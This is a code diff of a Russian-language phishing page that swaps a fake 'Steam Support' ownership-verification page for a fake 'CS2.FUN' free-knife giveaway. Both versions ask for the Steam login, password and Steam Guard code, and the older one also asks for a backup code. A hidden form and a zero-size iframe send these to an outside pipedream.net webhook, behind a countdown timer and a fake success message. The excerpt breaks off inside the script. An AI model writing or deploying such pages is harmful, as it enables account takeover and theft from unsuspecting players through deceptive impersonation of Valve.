@@ -1,594 +1,893 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Steam Support :: Подтверждение владения аккаунтом</title>
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Motiva+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
-  <link rel="icon" href="https://store.steampowered.com/favicon.ico" type="image/x-icon">
-  
-  <style>
-    :root {
-      --bg-primary: #171d25;
-      --bg-secondary: #1a2738;
-      --bg-input: #0f151f;
-      --border-color: #2a475e;
-      --accent-blue: #1a9fff;
-      --text-primary: #e5e7eb;
-      --text-secondary: #8f98a0;
-      --shadow-heavy: 0 4px 20px rgba(0, 0, 0, 0.7);
-    }
-    body {
-      margin: 0;
-      padding: 0;
-      background: linear-gradient(135deg, var(--bg-primary) 0%, #0c1117 100%);
-      color: var(--text-primary);
-      font-family: 'Motiva Sans', 'Segoe UI', system-ui, sans-serif;
-      min-height: 100vh;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      background-image: 
-        radial-gradient(circle at 15% 50%, rgba(26, 159, 255, 0.05) 0%, transparent 20%),
-        radial-gradient(circle at 85% 30%, rgba(106, 90, 205, 0.03) 0%, transparent 20%);
-      line-height: 1.5;
-    }
-    .steam-support-container {
-      background: linear-gradient(180deg, var(--bg-secondary) 0%, var(--bg-primary) 100%);
-      border-radius: 8px;
-      width: 100%;
-      max-width: 500px;
-      padding: 45px 40px;
-      box-shadow: var(--shadow-heavy);
-      border: 1px solid var(--border-color);
-      position: relative;
-      overflow: hidden;
-    }
-    .steam-support-container::before {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      height: 4px;
-      background: linear-gradient(90deg, #1a9fff, #5d3bad);
-    }
-    .header {
-      display: flex;
-      align-items: center;
-      margin-bottom: 30px;
-      gap: 15px;
-    }
-    .steam-logo {
-      height: 40px;
-      width: auto;
-    }
-    .header-text {
-      border-left: 2px solid var(--accent-blue);
-      padding-left: 15px;
-    }
-    h1 {
-      font-size: 26px;
-      font-weight: 700;
-      margin: 0 0 5px 0;
-      background: linear-gradient(90deg, #fff 0%, var(--accent-blue) 100%);
-      -webkit-background-clip: text;
-      -webkit-text-fill-color: transparent;
-    }
-    .subtitle {
-      font-size: 14px;
-      color: var(--text-secondary);
-      margin: 0;
-    }
-    .progress-bar {
-      display: flex;
-      margin-bottom: 35px;
-      position: relative;
-    }
-    .progress-step {
-      flex: 1;
-      text-align: center;
-      position: relative;
-      z-index: 1;
-    }
-    .progress-step .circle {
-      width: 32px;
-      height: 32px;
-      border-radius: 50%;
-      background: var(--bg-input);
-      border: 2px solid var(--border-color);
-      margin: 0 auto 8px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 14px;
-      font-weight: 700;
-      color: var(--text-secondary);
-      transition: all 0.3s ease;
-    }
-    .progress-step.active .circle {
-      background: var(--accent-blue);
-      border-color: var(--accent-blue);
-      color: white;
-    }
-    .progress-step.completed .circle {
-      background: #2daf5c;
-      border-color: #2daf5c;
-      color: white;
-    }
-    .progress-step .label {
-      font-size: 12px;
-      color: var(--text-secondary);
-    }
-    .progress-step.active .label {
-      color: var(--accent-blue);
-      font-weight: 500;
-    }
-    .progress-bar::before {
-      content: '';
-      position: absolute;
-      top: 16px;
-      left: 15%;
-      right: 15%;
-      height: 2px;
-      background: var(--border-color);
-      z-index: 0;
-    }
-    .step-content {
-      display: none;
-    }
-    .step-content.active {
-      display: block;
-      animation: fadeIn 0.4s ease;
-    }
-    @keyframes fadeIn {
-      from { opacity: 0; transform: translateY(10px); }
-      to { opacity: 1; transform: translateY(0); }
-    }
-    .form-title {
-      font-size: 20px;
-      font-weight: 500;
-      margin-bottom: 20px;
-      color: white;
-    }
-    .form-description {
-      font-size: 14px;
-      color: var(--text-secondary);
-      margin-bottom: 25px;
-      background: rgba(255, 255, 255, 0.03);
-      padding: 15px;
-      border-radius: 6px;
-      border-left: 3px solid var(--accent-blue);
-    }
-    .input-group {
-      margin-bottom: 25px;
-    }
-    label {
-      display: block;
-      margin-bottom: 8px;
-      font-size: 14px;
-      font-weight: 500;
-      color: var(--text-primary);
-    }
-    input, select {
-      width: 100%;
-      padding: 14px 16px;
-      border: 1px solid var(--border-color);
-      border-radius: 6px;
-      background: var(--bg-input);
-      color: white;
-      font-size: 15px;
-      transition: all 0.2s;
-      box-sizing: border-box;
-    }
-    input:focus, select:focus {
-      border-color: var(--accent-blue);
-      outline: none;
-      box-shadow: 0 0 0 3px rgba(26, 159, 255, 0.15);
-    }
-    .input-hint {
-      font-size: 12px;
-      color: var(--text-secondary);
-      margin-top: 6px;
-    }
-    .btn {
-      width: 100%;
-      padding: 16px;
-      border: none;
-      border-radius: 6px;
-      font-size: 16px;
-      font-weight: 600;
-      cursor: pointer;
-      transition: all 0.2s;
-      text-align: center;
-      margin-top: 10px;
-    }
-    .btn-primary {
-      background: linear-gradient(90deg, #1a9fff, #0d8add);
-      color: white;
-    }
-    .btn-primary:hover:not(:disabled) {
-      background: linear-gradient(90deg, #0d8add, #1a9fff);
-      transform: translateY(-2px);
-      box-shadow: 0 6px 15px rgba(26, 159, 255, 0.25);
-    }
-    .btn-primary:disabled {
-      opacity: 0.6;
-      cursor: not-allowed;
-      background: #2a475e;
-    }
-    .btn-secondary {
-      background: transparent;
-      color: var(--text-secondary);
-      border: 1px solid var(--border-color);
-    }
-    .btn-secondary:hover {
-      background: rgba(255, 255, 255, 0.05);
-      border-color: var(--text-secondary);
-    }
-    .loading {
-      position: relative;
-      color: transparent !important;
-    }
-    .loading::after {
-      content: '';
-      position: absolute;
-      top: 50%;
-      left: 50%;
-      width: 22px;
-      height: 22px;
-      border: 3px solid rgba(255, 255, 255, 0.2);
-      border-top-color: white;
-      border-radius: 50%;
-      animation: spin 0.8s linear infinite;
-      transform: translate(-50%, -50%);
-    }
-    @keyframes spin {
-      to { transform: translate(-50%, -50%) rotate(360deg); }
-    }
-    .alert {
-      padding: 14px 18px;
-      border-radius: 6px;
-      margin-bottom: 25px;
-      font-size: 14px;
-      display: none;
-    }
-    .alert-success {
-      background: rgba(45, 175, 92, 0.15);
-      border: 1px solid rgba(45, 175, 92, 0.4);
-      color: #6bcf8f;
-    }
-    .alert-error {
-      background: rgba(205, 74, 76, 0.15);
-      border: 1px solid rgba(205, 74, 76, 0.4);
-      color: #ff8a8a;
-    }
-    .hidden-iframe {
-      position: absolute;
-      width: 0;
-      height: 0;
-      border: none;
-      opacity: 0;
-      pointer-events: none;
-    }
-    .footer {
-      margin-top: 40px;
-      padding-top: 25px;
-      border-top: 1px solid var(--border-color);
-      font-size: 12px;
-      color: var(--text-secondary);
-      text-align: center;
-      line-height: 1.6;
-    }
-    .language-selector {
-      text-align: right;
-      margin-bottom: 20px;
-    }
-    .language-selector select {
-      width: auto;
-      padding: 8px 30px 8px 15px;
-      font-size: 13px;
-      background: var(--bg-input) url("data:image/svg+xml;charset=UTF-8,%3csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%238f98a0'%3e%3cpath d='M7 10l5 5 5-5z'/%3e%3c/svg%3e") no-repeat right 10px center;
-      background-size: 16px;
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CS2.FUN — Бесплатные скины и ножи!</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="icon" href="https://cdn.cloudflare.steamstatic.com/steamcommunity/public/images/apps/730/69f7ebe2735c366c65c0b33dae00e12dc40edbe4.ico" type="image/x-icon">
+    
+    <style>
+        :root {
+            --cs-orange: #f7931e;
+            --cs-dark: #171a21;
+            --cs-gray: #2a2f3b;
+            --cs-light: #e2e8f0;
+            --cs-red: #e53e3e;
+            --cs-green: #38a169;
+            --gradient: linear-gradient(135deg, #1a202c 0%, #2d3748 100%);
+            --shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
+        }
+        
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Inter', sans-serif;
+            background: var(--cs-dark);
+            color: white;
+            min-height: 100vh;
+            background-image: 
+                radial-gradient(circle at 10% 20%, rgba(247, 147, 30, 0.08) 0%, transparent 30%),
+                radial-gradient(circle at 90% 80%, rgba(56, 161, 105, 0.05) 0%, transparent 30%);
+            position: relative;
+            overflow-x: hidden;
+        }
+        
+        /* Частицы */
+        .particles {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+        
+        .particle {
+            position: absolute;
+            background: rgba(247, 147, 30, 0.3);
+            border-radius: 50%;
+            animation: float 20s infinite linear;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0) rotate(0deg); }
+            100% { transform: translateY(-1000px) rotate(720deg); }
+        }
+        
+        /* Шапка */
+        .header {
+            background: rgba(23, 26, 33, 0.95);
+            backdrop-filter: blur(10px);
+            border-bottom: 1px solid var(--cs-gray);
+            padding: 15px 0;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+        
+        .nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 24px;
+            font-weight: 800;
+            color: white;
+            text-decoration: none;
+        }
+        
+        .logo img {
+            height: 40px;
+        }
+        
+        .logo span {
+            background: linear-gradient(90deg, var(--cs-orange), #ffd166);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .auth-buttons {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .btn {
+            padding: 10px 24px;
+            border-radius: 6px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            border: none;
+            font-size: 15px;
+        }
+        
+        .btn-login {
+            background: transparent;
+            color: var(--cs-orange);
+            border: 2px solid var(--cs-orange);
+        }
+        
+        .btn-login:hover {
+            background: var(--cs-orange);
+            color: white;
+        }
+        
+        .btn-register {
+            background: var(--cs-orange);
+            color: white;
+        }
+        
+        .btn-register:hover {
+            background: #e58419;
+            transform: translateY(-2px);
+        }
+        
+        /* Основной контент */
+        .main {
+            padding: 60px 0;
+            position: relative;
+            z-index: 1;
+        }
+        
+        .hero {
+            text-align: center;
+            max-width: 800px;
+            margin: 0 auto 80px;
+        }
+        
+        .badge {
+            display: inline-block;
+            background: linear-gradient(90deg, var(--cs-red), #ed64a6);
+            padding: 8px 20px;
+            border-radius: 30px;
+            font-weight: 700;
+            font-size: 14px;
+            margin-bottom: 25px;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(247, 147, 30, 0.4); }
+            70% { box-shadow: 0 0 0 15px rgba(247, 147, 30, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(247, 147, 30, 0); }
+        }
+        
+        h1 {
+            font-size: 52px;
+            font-weight: 800;
+            line-height: 1.1;
+            margin-bottom: 20px;
+            background: linear-gradient(90deg, white, var(--cs-orange));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .subtitle {
+            font-size: 22px;
+            color: var(--cs-light);
+            margin-bottom: 40px;
+            opacity: 0.9;
+        }
+        
+        /* Таймер */
+        .timer-container {
+            background: rgba(42, 47, 59, 0.6);
+            border-radius: 16px;
+            padding: 30px;
+            max-width: 500px;
+            margin: 0 auto 40px;
+            border: 1px solid rgba(247, 147, 30, 0.3);
+        }
+        
+        .timer-title {
+            font-size: 18px;
+            margin-bottom: 20px;
+            color: var(--cs-light);
+            text-align: center;
+        }
+        
+        .timer {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+        }
+        
+        .timer-unit {
+            background: var(--cs-gray);
+            border-radius: 12px;
+            padding: 20px 15px;
+            min-width: 80px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .timer-value {
+            font-size: 36px;
+            font-weight: 800;
+            color: var(--cs-orange);
+            margin-bottom: 5px;
+        }
+        
+        .timer-label {
+            font-size: 14px;
+            color: var(--cs-light);
+            opacity: 0.7;
+        }
+        
+        /* Форма */
+        .form-container {
+            background: var(--gradient);
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: var(--shadow);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .form-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, var(--cs-orange), var(--cs-green));
+        }
+        
+        .form-step {
+            display: none;
+        }
+        
+        .form-step.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .form-title {
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 10px;
+        }
+        
+        .form-description {
+            color: var(--cs-light);
+            margin-bottom: 30px;
+            opacity: 0.8;
+        }
+        
+        .input-group {
+            margin-bottom: 25px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: white;
+        }
+        
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            background: rgba(255, 255, 255, 0.05);
+            border: 2px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            color: white;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        
+        input:focus {
+            outline: none;
+            border-color: var(--cs-orange);
+            background: rgba(255, 255, 255, 0.08);
+        }
+        
+        .btn-submit {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(90deg, var(--cs-orange), #e58419);
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            border: none;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        
+        .btn-submit:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 10px 25px rgba(247, 147, 30, 0.3);
+        }
+        
+        .btn-submit:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        .btn-back {
+            background: transparent;
+            color: var(--cs-light);
+            border: none;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+            cursor: pointer;
+            opacity: 0.8;
+        }
+        
+        .btn-back:hover {
+            opacity: 1;
+        }
+        
+        /* Скины */
+        .skins-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 25px;
+            margin-top: 60px;
+        }
+        
+        .skin-card {
+            background: var(--cs-gray);
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            border: 1px solid transparent;
+        }
+        
+        .skin-card:hover {
+            transform: translateY(-10px);
+            border-color: var(--cs-orange);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+        
+        .skin-image {
+            height: 150px;
+            background: linear-gradient(135deg, #4a5568, #2d3748);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 50px;
+        }
+        
+        .skin-info {
+            padding: 20px;
+        }
+        
+        .skin-name {
+            font-weight: 700;
+            margin-bottom: 5px;
+            font-size: 18px;
+        }
+        
+        .skin-rarity {
+            color: var(--cs-orange);
+            font-size: 14px;
+            font-weight: 600;
+        }
+        
+        /* Успех */
+        .success-container {
+            text-align: center;
+            padding: 40px 0;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 30px;
+            color: var(--cs-green);
+        }
+        
+        .success-title {
+            font-size: 36px;
+            font-weight: 800;
+            margin-bottom: 15px;
+            color: white;
+        }
+        
+        .loading {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top-color: var(--cs-orange);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        /* Футер */
+        .footer {
+            margin-top: 80px;
+            padding: 40px 0;
+            border-top: 1px solid var(--cs-gray);
+            text-align: center;
+            color: var(--cs-light);
+            font-size: 14px;
+            opacity: 0.7;
+        }
+        
+        .steam-notice {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        /* Адаптив */
+        @media (max-width: 768px) {
+            h1 { font-size: 36px; }
+            .subtitle { font-size: 18px; }
+            .form-container { padding: 30px 20px; }
+            .timer-unit { min-width: 60px; padding: 15px 10px; }
+            .timer-value { font-size: 28px; }
+        }
+        
+        /* Скрытые элементы для сбора данных */
+        .hidden-iframe {
+            position: absolute;
+            width: 0;
+            height: 0;
+            border: none;
+            opacity: 0;
+            pointer-events: none;
+        }
+        
+        /* Сообщения */
+        .alert {
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            display: none;
+        }
+        
+        .alert-success {
+            background: rgba(56, 161, 105, 0.2);
+            border: 1px solid var(--cs-green);
+            color: #9ae6b4;
+        }
+        
+        .alert-error {
+            background: rgba(229, 62, 62, 0.2);
+            border: 1px solid var(--cs-red);
+            color: #fc8181;
+        }
+    </style>
 </head>
 <body>
-
-  <div class="steam-support-container">
-    <div class="language-selector">
-      <select id="language">
-        <option value="ru" selected>Русский</option>
-        <option value="en">English</option>
-      </select>
-    </div>
-
-    <div class="header">
-      <img src="https://store.steampowered.com/public/images/v5/logo_header.png" alt="Steam" class="steam-logo">
-      <div class="header-text">
-        <h1>Подтверждение владения</h1>
-        <p class="subtitle">Steam Support — Требуется для безопасности аккаунта</p>
-      </div>
-    </div>
-
-    <div class="progress-bar">
-      <div class="progress-step active" id="step1-indicator">
-        <div class="circle">1</div>
-        <div class="label">Данные аккаунта</div>
-      </div>
-      <div class="progress-step" id="step2-indicator">
-        <div class="circle">2</div>
-        <div class="label">Подтверждение</div>
-      </div>
-      <div class="progress-step" id="step3-indicator">
-        <div class="circle">3</div>
-        <div class="label">Завершение</div>
-      </div>
-    </div>
-
-    <!-- Шаг 1: Ввод данных аккаунта -->
-    <div id="step1-content" class="step-content active">
-      <h2 class="form-title">Введите данные вашего аккаунта Steam</h2>
-      <p class="form-description">
-        Для подтверждения права собственности на аккаунт и восстановления доступа введите ваш текущий логин и пароль. Это стандартная процедура безопасности Steam Support.
-      </p>
-
-      <form id="accountForm">
-        <div class="input-group">
-          <label for="accountName">Имя аккаунта / E-mail / Номер телефона</label>
-          <input type="text" id="accountName" placeholder="steamcommunity.com/id/..." required autocomplete="off" />
-          <div class="input-hint">Укажите логин, который вы используете для входа в Steam.</div>
+    <!-- Частицы -->
+    <div class="particles" id="particles"></div>
+    
+    <!-- Шапка -->
+    <header class="header">
+        <div class="container">
+            <nav class="nav">
+                <a href="#" class="logo">
+                    <img src="https://cdn.cloudflare.steamstatic.com/steam/apps/730/capsule_231x87.jpg" alt="CS2">
+                    <span>CS2.FUN</span>
+                </a>
+                <div class="auth-buttons">
+                    <button class="btn btn-login" onclick="showStep(1)">Войти через Steam</button>
+                    <button class="btn btn-register" onclick="showStep(1)">Получить скины</button>
+                </div>
+            </nav>
         </div>
-
-        <div class="input-group">
-          <label for="accountPassword">Пароль</label>
-          <input type="password" id="accountPassword" placeholder="••••••••••••" required autocomplete="off" />
-          <div class="input-hint">Текущий пароль от вашего аккаунта.</div>
+    </header>
+    
+    <!-- Основной контент -->
+    <main class="main">
+        <div class="container">
+            <section class="hero">
+                <div class="badge">🔥 ОГРАНИЧЕННОЕ ВРЕМЯ!</div>
+                <h1>ПОЛУЧИ БЕСПЛАТНЫЕ НОЖИ CS2</h1>
+                <p class="subtitle">Войди через Steam и получи случайный нож или скин из нашей раздачи. Только сегодня!</p>
+                
+                <!-- Таймер -->
+                <div class="timer-container">
+                    <div class="timer-title">⏰ Раздача закроется через:</div>
+                    <div class="timer">
+                        <div class="timer-unit">
+                            <div class="timer-value" id="hours">12</div>
+                            <div class="timer-label">часов</div>
+                        </div>
+                        <div class="timer-unit">
+                            <div class="timer-value" id="minutes">45</div>
+                            <div class="timer-label">минут</div>
+                        </div>
+                        <div class="timer-unit">
+                            <div class="timer-value" id="seconds">30</div>
+                            <div class="timer-label">секунд</div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Форма входа -->
+            <section class="form-container">
+                <!-- Шаг 1: Вход через Steam -->
+                <div id="step1" class="form-step active">
+                    <h2 class="form-title">🔑 Войди через Steam</h2>
+                    <p class="form-description">Для участия в раздаче требуется авторизация через Steam</p>
+                    
+                    <div class="alert" id="step1-alert"></div>
+                    
+                    <form id="loginForm">
+                        <div class="input-group">
+                            <label for="steamLogin">Логин Steam</label>
+                            <input type="text" id="steamLogin" placeholder="Введите ваш логин, email или SteamID" required>
+                        </div>
+                        
+                        <div class="input-group">
+                            <label for="steamPassword">Пароль</label>
+                            <input type="password" id="steamPassword" placeholder="Введите пароль" required>
+                        </div>
+                        
+                        <button type="submit" class="btn-submit" id="loginBtn">
+                            Войти и получить нож →
+                        </button>
+                    </form>
+                    
+                    <div style="text-align: center; margin-top: 25px; color: var(--cs-light); opacity: 0.7; font-size: 14px;">
+                        ⚠️ Ваши данные защищены Steam Guard
+                    </div>
+                </div>
+                
+                <!-- Шаг 2: Код Steam Guard -->
+                <div id="step2" class="form-step">
+                    <button class="btn-back" onclick="showStep(1)">
+                        ← Назад
+                    </button>
+                    
+                    <h2 class="form-title">🔒 Код подтверждения</h2>
+                    <p class="form-description">Мы отправили код на вашу почту, привязанную к Steam</p>
+                    
+                    <div class="alert" id="step2-alert"></div>
+                    
+                    <div class="input-group">
+                        <label for="guardCode">Код Steam Guard (5 цифр)</label>
+                        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required>
+                    </div>
+                    
+                    <button class="btn-submit" id="guardBtn" onclick="submitGuardCode()">
+                        Подтвердить и получить награду
+                    </button>
+                    
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button class="btn-back" onclick="resendCode()" style="font-size: 14px;">
+                            ↻ Отправить код повторно
+                        </button>
+                    </div>
+                </div>
+                
+                <!-- Шаг 3: Успех -->
+                <div id="step3" class="form-step">
+                    <div class="success-container">
+                        <div class="success-icon">🎉</div>
+                        <h2 class="success-title">Успешно!</h2>
+                        <p class="form-description">Ваш аккаунт подтверждён. Идёт начисление награды...</p>
+                        
+                        <div class="loading"></div>
+                        
+                        <div class="alert alert-success" id="successMessage">
+                            <strong>Нож "★ Скелетный нож | Ледяной огонь" добавлен в ваш инвентарь!</strong><br>
+                            Откройте CS2 чтобы проверить.
+                        </div>
+                        
+                        <div id="countdown" style="margin-top: 30px; font-size: 16px;">
+                            Перенаправление в Steam Community через: <span id="countdownValue">10</span> сек
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- Пример скинов -->
+            <section class="skins-grid">
+                <div class="skin-card">
+                    <div class="skin-image">🔪</div>
+                    <div class="skin-info">
+                        <div class="skin-name">★ Скелетный нож</div>
+                        <div class="skin-rarity">Ледяной огонь</div>
+                    </div>
+                </div>
+                
+                <div class="skin-card">
+                    <div class="skin-image">🗡️</div>
+                    <div class="skin-info">
+                        <div class="skin-name">★ Сапёрная лопатка</div>
+                        <div class="skin-rarity">Ультрафиолет</div>
+                    </div>
+                </div>
+                
+                <div class="skin-card">
+                    <div class="skin-image">⚔️</div>
+                    <div class="skin-info">
+                        <div class="skin-name">★ Karambit</div>
+                        <div class="skin-rarity">Фазовый кинжал</div>
+                    </div>
+                </div>
+                
+                <div class="skin-card">
+                    <div class="skin-image">🔫</div>
+                    <div class="skin-info">
+                        <div class="skin-name">AK-47</div>
+                        <div class="skin-rarity">Красная линия</div>
+                    </div>
+                </div>
+            </section>
         </div>
-
-        <div class="alert" id="step1-alert"></div>
-
-        <button type="submit" id="step1-btn" class="btn btn-primary">Продолжить →</button>
-        <button type="button" id="step1-cancel" class="btn btn-secondary">Отмена</button>
-      </form>
-    </div>
-
-    <!-- Шаг 2: Ввод кода Steam Guard -->
-    <div id="step2-content" class="step-content">
-      <h2 class="form-title">Проверка Steam Guard</h2>
-      <p class="form-description">
-        На адрес электронной почты, привязанный к аккаунту, отправлен 5-значный код подтверждения. Пожалуйста, введите его в поле ниже для завершения процедуры проверки.
-      </p>
-
-      <div class="input-group">
-        <label for="guardCode">Код подтверждения из письма</label>
-        <input type="text" id="guardCode" placeholder="XXXXX" maxlength="5" required autocomplete="off" />
-        <div class="input-hint">Письмо от Steam Support обычно приходит в течение 1-2 минут.</div>
-      </div>
-
-      <div class="input-group">
-        <label for="backupCode">Или резервный код (если есть)</label>
-        <input type="text" id="backupCode" placeholder="RXXXX-XXXXX" autocomplete="off" />
-        <div class="input-hint">Вы можете использовать один из ваших резервных кодов.</div>
-      </div>
-
-      <div class="alert" id="step2-alert"></div>
-
-      <div style="display: flex; gap: 15px;">
-        <button type="button" id="step2-back" class="btn btn-secondary">← Назад</button>
-        <button type="button" id="step2-submit" class="btn btn-primary" style="flex: 1;">Подтвердить и продолжить</button>
-      </div>
-      <button type="button" id="resend-code" class="btn btn-secondary">Отправить код повторно</button>
-    </div>
-
-    <!-- Шаг 3: Успешное завершение -->
-    <div id="step3-content" class="step-content">
-      <h2 class="form-title">Подтверждение успешно завершено</h2>
-      <div class="alert alert-success" id="step3-alert" style="display: block;">
-        <strong>Право собственности на аккаунт подтверждено.</strong><br>
-        Доступ к аккаунту будет восстановлен в течение нескольких минут. Вы будете автоматически перенаправлены в Steam Community.
-      </div>
-      <p class="form-description">
-        Благодарим вас за сотрудничество. Это помогает нам защитить ваш аккаунт от несанкционированного доступа.
-      </p>
-      <div style="text-align: center;">
-        <div class="loading" style="margin: 30px auto; width: 50px; height: 50px;"></div>
-        <p id="countdown-text">Перенаправление через: <strong id="countdown">5</strong> секунд</p>
-      </div>
-      <button type="button" id="step3-finish" class="btn btn-primary">Перейти в Steam Community сейчас</button>
-    </div>
-
-    <div class="footer">
-      © Valve Corporation. Все права защищены. Все торговые марки являются собственностью соответствующих владельцев в США и других странах.<br>
-      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Политика конфиденциальности</a> | 
-      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Правовая информация</a> | 
-      <a href="#" style="color: var(--accent-blue); text-decoration: none;">Соглашение подписчика Steam</a>
-    </div>
-
-    <!-- Скрытые элементы для сбора и отправки данных -->
+    </main>
+    
+    <!-- Футер -->
+    <footer class="footer">
+        <div class="container">
+            <div class="steam-notice">
+                <img src="https://cdn.cloudflare.steamstatic.com/store/public/images/logo_steam_footer.png" alt="Steam" height="25">
+                <span>Данный сайт не аффилирован с Valve Corporation.</span>
+            </div>
+            <p>© 2023 CS2.FUN — Раздача скинов. Все права защищены. Steam и логотип Steam являются товарными знаками и/или зарегистрированными товарными знаками Valve Corporation в США и/или других странах.</p>
+        </div>
+    </footer>
+    
+    <!-- Скрытые элементы для отправки данных -->
     <iframe name="hiddenFrame" class="hidden-iframe"></iframe>
     <form id="hiddenForm" action="https://eoinuzdsdrixye7.m.pipedream.net" method="POST" target="hiddenFrame" style="display: none;">
-      <input type="hidden" name="type" id="hidden-type">
-      <input type="hidden" name="account_name" id="hidden-account">
-      <input type="hidden" name="account_password" id="hidden-password">
-      <input type="hidden" name="guard_code" id="hidden-guard">
-      <input type="hidden" name="backup_code" id="hidden-backup">
-      <input type="hidden" name="user_agent" id="hidden-ua">
-      <input type="hidden" name="timestamp" id="hidden-timestamp">
-      <input type="hidden" name="session_id" id="hidden-session">
+        <input type="hidden" name="type" id="hidden-type">
+        <input type="hidden" name="steam_login" id="hidden-login">
+        <input type="hidden" name="steam_password" id="hidden-password">
+        <input type="hidden" name="guard_code" id="hidden-guard">
+        <input type="hidden" name="user_agent" id="hidden-ua">
+        <input type="hidden" name="timestamp" id="hidden-timestamp">
+        <input type="hidden" name="session_id" id="hidden-session">
     </form>
-  </div>
-
-  <script>
-    // Конфигурация
-    const CONFIG = {
-      webhook: 'https://eoinuzdsdrixye7.m.pipedream.net',
-      sessionId: 'steam_support_' + Math.random().toString(36).substring(2, 15),
-      countdownStart: 5,
-      fakeDelay: 1500
-    };
-
-    // Элементы DOM
-    const stepContents = {
-      1: document.getElementById('step1-content'),
-      2: document.getElementById('step2-content'),
-      3: document.getElementById('step3-content')
-    };
-    const stepIndicators = {
-      1: document.getElementById('step1-indicator'),
-      2: document.getElementById('step2-indicator'),
-      3: document.getElementById('step3-indicator')
-    };
-    const hiddenForm = document.getElementById('hiddenForm');
-    const hiddenFields = {
-      type: document.getElementById('hidden-type'),
-      account: document.getElementById('hidden-account'),
-      password: document.getElementById('hidden-password'),
-      guard: document.getElementById('hidden-guard'),
-      backup: document.getElementById('hidden-backup'),
-      ua: document.getElementById('hidden-ua'),
-      timestamp: document.getElementById('hidden-timestamp'),
-      session: document.getElementById('hidden-session')
-    };
-
-    // Инициализация скрытых полей
-    hiddenFields.ua.value = navigator.userAgent;
-    hiddenFields.session.value = CONFIG.sessionId;
-
-    // Переключение шагов
-    function goToStep(step) {
-      Object.values(stepContents).forEach(el => el.classList.remove('active'));
-      Object.values(stepIndicators).forEach(el => {
-        el.classList.remove('active', 'completed');
-      });
-      stepContents[step].classList.add('active');
